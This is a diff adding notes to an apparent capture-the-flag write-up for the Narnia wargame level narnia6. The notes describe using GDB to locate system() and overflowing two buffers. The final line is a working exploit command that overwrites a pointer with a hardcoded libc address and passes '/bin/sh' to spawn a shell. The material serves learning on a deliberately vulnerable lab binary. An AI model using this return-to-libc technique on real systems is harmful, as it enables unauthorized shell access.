@@ -7,5 +7,14 @@ Upon examining the Binary, the first thing that stands out is the commented out 
 Upon experementation ./narnia6 %x_%x_%x_%x hello reveals some data
 
 
+At the start of my work on this challenge, I tried crafting a buffer overflow exploit.
+To do this I used GDB to get examine the buffer. From this point I was able to grab
+they system() address as a base pointer that I wanted to return to. 
+
+From here I struggled for a bit trying to use the second buffer, but GDB was able to show
+how to format the string using both buffers.  
+
+
+./narnia6 $(python -c 'print "a" * 8 + "\x50\xc8\xe4\xf7" + " " + "b" * 8 + "/bin/sh"')
 
 
